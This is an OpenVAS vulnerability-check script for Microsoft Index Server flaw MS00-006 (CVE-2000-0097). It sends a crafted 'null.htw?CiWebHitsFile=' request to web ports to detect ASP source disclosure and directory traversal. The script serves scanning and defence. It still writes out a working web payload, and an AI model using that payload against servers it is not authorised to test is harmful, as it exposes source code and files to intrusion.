# OpenVAS Vulnerability Test
# $Id: remote-MS00-006.nasl 16 2013-10-27 13:09:52Z jan $
# Description: 
# This program test for the following vulnerabilities:
# Microsoft Index Server File Information and Path Disclosure Vulnerability (MS00-006)
# Microsoft Index Server 'Malformed Hit-Highlighting' Directory Traversal Vulnerability (MS00-006)
# Microsoft IIS 'idq.dll' Directory Traversal Vulnerability (MS00-006)
# Microsoft Index Server ASP Source Code Disclosure Vulnerability (MS00-006)
#
# remote-MS00-006.nasl
#
# Author:
# Christian Eric Edjenguele <christian.edjenguele@owasp.org>
# Slight modification by Vlatko Kosturjak - Kost <kost@linux.hr>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 or later,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The WebHits ISAPI filter in Microsoft Index Server allows remote attackers to read arbitrary files, 
aka the 'Malformed Hit-Highlighting Argument' vulnerability MS00-06.";

tag_solution = "To Fix that, you must download the patches from microsoft security website: 
http://www.microsoft.com/TechNet/security/bulletin/ms00-006.asp.";

 

 
 if(description)
{
script_id(80007);
script_version("$Revision: 16 $");
script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
script_tag(name:"creation_date", value:"2008-09-09 16:54:39 +0200 (Tue, 09 Sep 2008)");
script_tag(name:"cvss_base", value:"5.0");
script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
script_tag(name:"risk_factor", value:"Medium");
script_bugtraq_id(950);
script_cve_id("CVE-2000-0097");
name = "Microsoft MS00-06 security check ";
script_name(name);
 
desc = "
Summary:
" + tag_summary + "
Solution:
" + tag_solution;
script_description(desc);

summary = "A vulnerability on Microsoft index server allows unauthorized predictable file location";

script_summary(summary);

script_category(ACT_ATTACK);

script_copyright("Christian Eric Edjenguele <christian.edjenguele@owasp.org>");
family = "General";
script_family(family);
script_dependencies("find_service.nasl");
script_require_ports("Services/www");


 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");


iis_servers = get_kb_list("Services/www");

# Asp files the plugin will test
pages  = make_array( 1, 'default.asp', 2, 'iisstart.asp', 3, 'localstart.asp', 4, 'index.asp');

# connect to the remote host
foreach port (iis_servers)
{
	# Build the malicious request
	foreach asp_file (pages)
	{
		soc = open_sock_tcp(port);
		if(!soc)continue;

		req = http_get( item:string("/null.htw?CiWebHitsFile=/" + asp_file + "%20&CiRestriction=none&CiHiliteType=Full"), port:port);
		send(socket:soc, data: req);

		# Get back the response
		reply = recv(socket:soc, length:1204);

		close(soc);

			if(reply)
			{
				r = tolower(reply);
				if(("Microsoft-IIS" >< r ) && (egrep(pattern:"HTTP/1.[01] 200", string:r)) && ("<html>" >< r)) security_warning(port);
			}
	}
}
